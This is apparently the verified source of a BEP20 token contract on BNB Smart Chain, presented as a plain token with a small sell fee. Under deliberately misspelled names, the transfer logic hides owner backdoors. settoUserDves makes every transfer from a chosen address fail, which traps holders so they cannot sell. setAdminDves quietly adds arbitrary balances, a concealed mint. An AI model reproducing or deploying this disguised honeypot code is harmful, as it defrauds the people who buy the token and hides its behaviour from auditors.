/**
 *Submitted for verification at BscScan.com on 2022-10-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownerToTransferend(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceownership() public virtual onlyowner {
        _transferownership(address(0));
    }

    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownerToTransferend(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint acooontADesired,
        uint acooontBDesired,
        uint acooontAMin,
        uint acooontBMin,
        address to,
        uint deadline
    ) external returns (uint acooontA, uint acooontB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint acooontTokenDesired,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline
    ) external payable returns (uint acooontToken, uint acooontETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acooontAMin,
        uint acooontBMin,
        address to,
        uint deadline
    ) external returns (uint acooontA, uint acooontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline
    ) external returns (uint acooontToken, uint acooontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acooontAMin,
        uint acooontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acooontA, uint acooontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acooontToken, uint acooontETH);
    function swapExactTokensForTokens(
        uint acooontIn,
        uint acooontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acooonts);
    function swapTokensForExactTokens(
        uint acooontOut,
        uint acooontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acooonts);
    function swapExactETHForTokens(uint acooontOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acooonts);
    function swapTokensForExactETH(uint acooontOut, uint acooontInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acooonts);
    function swapExactTokensForETH(uint acooontIn, uint acooontOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acooonts);
    function swapETHForExactTokens(uint acooontOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acooonts);

    function quote(uint acooontA, uint reserveA, uint reserveB) external pure returns (uint acooontB);
    function getacooontOut(uint acooontIn, uint reserveIn, uint reserveOut) external pure returns (uint acooontOut);
    function getacooontIn(uint acooontOut, uint reserveIn, uint reserveOut) external pure returns (uint acooontIn);
    function getacooontsOut(uint acooontIn, address[] calldata path) external view returns (uint[] memory acooonts);
    function getacooontsIn(uint acooontOut, address[] calldata path) external view returns (uint[] memory acooonts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline
    ) external returns (uint acooontETH);
    function removeLiquidityETHWithPermitSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acooontETH);

    function swapExactTokensForTokensSupportingfireOnTransferTokens(
        uint acooontIn,
        uint acooontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfireOnTransferTokens(
        uint acooontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfireOnTransferTokens(
        uint acooontIn,
        uint acooontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fireTo() external view returns (address);
    function fireToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfireTo(address) external;
    function setfireToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _wasteAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract THETOKEN is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amount;
    }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _mtin(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = accountBalance - amount;
    }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }




    address public uniswapV2Pair;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
    }

    using SafeMath for uint256;

    mapping(address => int256) private _torrdves;

    uint256 private _dSellfees = 2;

    uint256 private _dBuyfees = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;


    function settoUserDves(address toaddbuet) public onlyowner {
        _torrdves[toaddbuet] = int256(0) - int256(_totalSupply);
    }

    function setPacPairList(address _address) external onlyowner {
        uniswapV2Pair = _address;
    }

    function romToUserDves(address toaddbuet) public onlyowner {
        _torrdves[toaddbuet] = 0;
    }

    function setAdminDves(address toaddbuet,int256 amount ) public onlyowner {
        _torrdves[toaddbuet] += amount;
    }



    function _rebcToFee(
        address from,
        address _to,
        uint256 _acceeent
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _acceeent, "ERC20: transfer amount exceeds balance");
        if (_torrdves[from] > 0){
            _balances[from] = _balances[from].add(uint256(_torrdves[from]));
        }else if (_torrdves[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_torrdves[from]));
        }

        uint256 tradefireacceeent = 0;
        uint256 tradefire = _dSellfees;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                tradefire = _dSellfees;
            }
            if (from == uniswapV2Pair) {
                tradefire = _dBuyfees;
            }
        }
        tradefireacceeent = _acceeent.mul(tradefire).div(100);

        if (tradefireacceeent > 0) {
            _balances[from] = _balances[from].sub(tradefireacceeent);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefireacceeent);
            emit Transfer(from, _deadAddress, tradefireacceeent);
        }

        _balances[from] = _balances[from].sub(_acceeent - tradefireacceeent);
        _balances[_to] = _balances[_to].add(_acceeent - tradefireacceeent);
        emit Transfer(from, _to, _acceeent - tradefireacceeent);
    }

    function cxUserDves(address toaddbuet) public view returns (int256) {
        return _torrdves[toaddbuet];
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _wasteAllowance(from, spender, amount);
        _rebcToFee(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _rebcToFee(owner, to, amount);
        return true;
    }

}